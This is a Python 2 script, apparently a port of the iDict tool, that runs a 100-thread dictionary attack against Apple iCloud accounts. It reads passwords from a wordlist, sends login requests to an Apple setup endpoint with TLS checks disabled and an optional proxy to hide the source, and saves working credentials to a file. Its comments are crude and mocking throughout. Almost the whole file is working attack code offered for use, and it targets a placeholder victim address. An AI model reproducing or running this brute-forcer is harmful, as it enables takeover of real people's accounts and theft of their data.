"""
A shitty hacked together Python version of this: https://github.com/Pr0x13/iDict

Prerequisites:
	requests
	threadpool

Both can be installed via pip or easy_install.
I"m not your mother, so I don"t feel like I should have to explain how to get them.

Shoutout to @sanitybit (the inventor of the DDoS and leader of LizardSquad), who will one day be my waifu

"""

import requests
import threadpool
import time #I AM ZILEAN

#disable those annoying as fuck urllib3 "WAAAH! NO SSL!" warnings.
requests.packages.urllib3.disable_warnings()

#hack the planet step 1
def getConfig():
	headers = {
		"User-Agent" : "Settings/1.0 CFNetwork/672.0.8 Darwin/14.0.0",
		"Proxy-Connection" : "Keep-Alive",
		"Accept" : "*/*",
		"Accept-Encoding" : "gzip, deflate",
		"Accept-Language" : "en-us",
		"X-MMe-Country" : "US",
		"Connection" : "keep-alive",
		"X-MMe-Client-Info" : "<iPhone4,1> <iPhone OS;7.0.4;11B554a> <com.apple.AppleAccount/1.0 (com.apple.Preferences/1.0)>",
	}
	response = requests.get("https://setup.icloud.com/configurations/init?context=settings", headers = headers, verify = False)
	if response.status_code == 200:
		config = response.content
		#Error handling is for pussies
		#I'm a hacker and this is lulzsec
		#Why the fuck did the dude fetch the 23rd URL from this response?
		#https://setup.icloud.com/setup/iosbuddy/loginDelegates was the URL... man, original PoC might have autism..
		#IF IT'S STATIC JUST DEFINE IT AS SUCH. NO NEED TO TRY AND SHOW OFF YOUR XML TREE PARSING WIZARDRY WITH
		#CRAZY ONE-LINERS LIKE "$xml = simplexml_load_string($plist);"
		#fuckin' haxors, man. I tell ya hwat.
		f = open("config.plist","w")
		f.write(config)
		f.close()
		print "We just fetched the ever-loving shit out of the config file because who the fuck knows why"
	else:
		print "Da fuck happened breh? HTTP status wasn't 200 for the config file fetching shit."
		
#hack the planet step 2
#just replacing the shit for the request. Why is XML still relevant again, guys?
def prepareLogin(apple_id, password, buffer):
	#you don't even know nothin' about my muhfuckin' string replacement game #untouchable
	buffer = buffer.replace("{apple_id}", apple_id)
	buffer = buffer.replace("{password}", password)
	return buffer

#let's execute some muh-fuckin' hacker requests
#10 bonus points if you accidentally perform a successful pikachu paket exploit on juken's TI-82
def doLogin(payload):
	apple_id, password, buffer, proxy = payload
	buffer = prepareLogin(apple_id, password, buffer) #SHIEEEEEEEEET
	headers = {
		"User-Agent" : "Settings/1.0 CFNetwork/672.0.8 Darwin/14.0.0",
		"Proxy-Connection" : "keep-alive",
		"Accept" : "*/*",
		"Accept-Encoding" : "gzip, deflate",
		"Content-Type" : "text/plist",
		"Accept-Language" : "en-us",
		"X-MMe-Country" : "US",
		"X-MMe-Client-Info" : "<iPhone4,1> <iPhone OS;7.0.4;11B554a> <com.apple.AppleAccount/1.0 (com.apple.Accounts/113)>",
		"Connection" : "keep-alive"
	}
	response = requests.post("https://setup.icloud.com/setup/iosbuddy/loginDelegates", headers = headers, data = buffer, verify = False, proxies = proxy)
	if response.status_code == 200:
		if "delegates" in response.content:
			print "1337 Hacking Success! %s:%s" % (apple_id, password)
			gs = open("government_secrets.txt","w")
			gs.write("\n%s:%s" % (apple_id, password))
			gs.close()
		else:
			print "Shitballs. Login for %s:%s was false as fuck..." % (apple_id, password)
			return False
	else:
		print "Login Error: Status code wasn't 200"
		return False
	
	
#hack the planet
if __name__ == "__main__":
	
	#PUT THE FUCKING APPLE ID HERE
	apple_id = "victim@nsa.gov"
	
	#NOTE: i do not condone hacking government officials or anything else that you redditors do in your free time.
	#(I'm looking at you, Mr. Guido)
	
	#Use a proxy or something, dumbass
	proxy = None
	#proxy = {
	#	"http" : "http://ip:port"
	#	"https" : "http://ip:port"
	#}
	
	getConfig() #Not sure why the original PoC guy is even doing this...
	
	#LOAD DA LISTSSSSS
	wordlist = open("wordlist.txt","r").read().split("\n")
	blank_payload = open("blank_payload.plist","r").read()
	
	thread_count = 100
	
	pool = threadpool.ThreadPool(thread_count)
	queue_arguments = []
	
	for password in wordlist:
		password = password.strip()#because fuck whitespace
		queue_arguments.append([apple_id,password,blank_payload,proxy])
	
	hacking_attempts = threadpool.makeRequests(doLogin, queue_arguments)
	for hacks in hacking_attempts:
		pool.putRequest(hacks)
	pool.wait()
	print "Sleeping for 5 seconds because threadpool is a bag of big, beautiful dicks"
	time.sleep(5)	
	exit() #real hackers use this function

	
	
